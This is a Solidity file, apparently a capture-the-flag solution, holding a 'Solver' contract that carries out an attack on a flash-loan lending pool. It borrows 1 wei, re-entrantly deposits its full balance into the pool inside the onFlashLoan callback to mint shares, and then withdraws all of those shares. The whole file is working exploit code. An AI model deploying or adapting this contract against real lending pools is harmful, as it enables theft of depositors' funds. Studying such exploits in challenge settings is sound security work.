// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20Minimal {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC3156FlashBorrower {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

interface ILoanPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract Solver is IERC3156FlashBorrower {
    /// @notice Kick off the attack
    function requestFlashLoan(address pool, address token) external {
        // 1) Borrow 1 wei (fee is tiny)
        ILoanPool(pool).flashLoan(IERC3156FlashBorrower(this), token, 1, "");

        // 4) After callback, withdraw all shares we just minted
        uint256 shares = ILoanPool(pool).balanceOf(address(this));
        ILoanPool(pool).withdraw(shares);
    }

    /// @dev Called by LoanPool during flashLoan()
    function onFlashLoan(
        address,       // initiator
        address token, // underlying token
        uint256,       // amount
        uint256,       // fee
        bytes calldata // data
    ) external override returns (bytes32) {
        // 2) Re-entrantly deposit _all_ tokens now in our balance
        uint256 bal = IERC20Minimal(token).balanceOf(address(this));
        IERC20Minimal(token).approve(msg.sender, bal);
        ILoanPool(msg.sender).deposit(bal);

        // 3) Return correct magic value
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
